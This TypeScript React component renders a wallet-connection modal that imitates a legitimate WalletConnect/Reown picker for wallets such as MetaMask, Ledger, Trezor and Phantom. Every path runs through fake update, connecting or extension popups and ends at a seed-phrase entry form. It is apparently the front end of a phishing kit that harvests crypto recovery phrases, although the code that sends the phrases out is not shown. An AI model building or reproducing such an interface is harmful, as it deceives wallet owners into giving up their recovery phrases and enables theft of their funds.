"use client"

import { useState } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Badge } from "@/components/ui/badge"
import { Globe } from "lucide-react"
import Image from "next/image"
import { SeedPhraseForm } from "@/components/seed-phrase-form"
import { WalletUpdatePopup } from "@/components/wallet-update-popup"
import { WalletConnectionAnimation } from "@/components/wallet-connection-animation"
import { PhantomExtensionPopup } from "@/components/phantom-extension-popup"

interface WalletConnectionModalProps {
  isOpen: boolean
  onClose: () => void
}

const popularWallets = [
  { name: "Metamask", logo: "/metamask.webp", color: "bg-orange-100" },
  { name: "Trust Wallet", logo: "/trustwallet.webp", color: "bg-blue-100" },
  { name: "Coinbase Wallet", logo: "/Coinbase.webp", color: "bg-blue-100" },
  { name: "Ledger", logo: "/ledger.webp", color: "bg-gray-100" },
  { name: "Trezor Wallet", logo: "/trezorwallet.svg", color: "bg-green-100" },
  { name: "Phantom Wallet", logo: "/phantom.webp", color: "bg-purple-100" },
  { name: "OKX Wallet", logo: "/OKX.webp", color: "bg-gray-100" },
  { name: "Rabby Wallet", logo: "/Rabby.webp", color: "bg-blue-100" },
  { name: "Uniswap Wallet", icon: "🦄", color: "bg-pink-100 text-pink-600" },
  { name: "Solflare", icon: "☀️", color: "bg-yellow-100 text-yellow-600" },
  { name: "Magic Eden", icon: "🎭", color: "bg-purple-100 text-purple-600" },
  { name: "Electrum", icon: "⚡", color: "bg-blue-100 text-blue-600" },
]

type ConnectionStep = "wallet-list" | "update" | "connecting" | "phantom-extension" | "seed-phrase"

export function WalletConnectionModal({ isOpen, onClose }: WalletConnectionModalProps) {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [connectionStep, setConnectionStep] = useState<ConnectionStep>("wallet-list")

  const handleWalletSelect = (walletName: string) => {
    setSelectedWallet(walletName)

    if (walletName === "Phantom Wallet") {
      setConnectionStep("phantom-extension")
    } else {
      setConnectionStep("update")
    }
  }

  const handleUpdateComplete = () => {
    if (!selectedWallet) return

    if (selectedWallet === "Ledger" || selectedWallet === "Trezor Wallet") {
      setConnectionStep("connecting")
    } else {
      setConnectionStep("seed-phrase")
    }
  }

  const handleConnectionComplete = () => {
    setConnectionStep("seed-phrase")
  }

  const handlePhantomConnect = () => {
    setConnectionStep("seed-phrase")
  }

  const handleClose = () => {
    setSelectedWallet(null)
    setConnectionStep("wallet-list")
    onClose()
  }

  const handleBack = () => {
    setSelectedWallet(null)
    setConnectionStep("wallet-list")
  }

  return (
    <>
      <Dialog open={isOpen && connectionStep === "wallet-list"} onOpenChange={handleClose}>
        <DialogContent className="w-[50em] max-w-none h-[40em] p-0 overflow-hidden" onClick={(e) => e.stopPropagation()}>
          <div className="flex h-full">
            {/* Left side - Wallet list */}
            <div className="flex-1 p-8 border-r">
              <DialogHeader className="mb-8">
                <div className="flex items-center gap-2 mb-2">
                  <Badge variant="secondary" className="bg-black text-white px-3 py-1 rounded-full">
                    reown
                  </Badge>
                  <span className="text-sm text-gray-600">Manual Kit</span>
                </div>
                <DialogTitle className="text-left text-xl">Popular Wallets:</DialogTitle>
              </DialogHeader>

              <div className="space-y-4 max-h-[calc(100%-140px)] overflow-y-auto">
                {popularWallets.map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={() => handleWalletSelect(wallet.name)}
                    className="w-full flex items-center gap-4 p-4 rounded-xl hover:bg-gray-50 transition-colors text-left border border-gray-100 hover:border-gray-200"
                  >
                    <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${wallet.color} p-2`}>
                      {wallet.logo ? (
                        <Image
                          src={wallet.logo}
                          alt={`${wallet.name} logo`}
                          width={32}
                          height={32}
                          className="w-8 h-8 object-contain"
                        />
                      ) : (
                        <span className="text-lg">{wallet.icon}</span>
                      )}
                    </div>
                    <span className="font-medium text-gray-900 text-lg">{wallet.name}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Right side - Connection status */}
            
          </div>
        </DialogContent>
      </Dialog>

      {/* Seed Phrase Form Modal */}
      <Dialog open={isOpen && connectionStep === "seed-phrase"} onOpenChange={handleClose}>
        <DialogContent className="max-w-2xl h-[80vh] p-6 overflow-hidden" onClick={(e) => e.stopPropagation()}>
          <SeedPhraseForm walletName={selectedWallet || ""} onBack={handleBack} onClose={handleClose} />
        </DialogContent>
      </Dialog>

      {/* Update Popup */}
      {selectedWallet && (
        <WalletUpdatePopup
          isOpen={connectionStep === "update"}
          onClose={handleClose}
          walletName={selectedWallet}
          onUpdateComplete={handleUpdateComplete}
        />
      )}

      {/* Connection Animation */}
      {selectedWallet && (
        <WalletConnectionAnimation
          isOpen={connectionStep === "connecting"}
          onClose={handleClose}
          walletName={selectedWallet}
          onConnectionComplete={handleConnectionComplete}
        />
      )}

      {/* Phantom Extension Popup */}
      <PhantomExtensionPopup
        isOpen={connectionStep === "phantom-extension"}
        onClose={handleClose}
        onConnect={handlePhantomConnect}
      />
    </>
  )
}
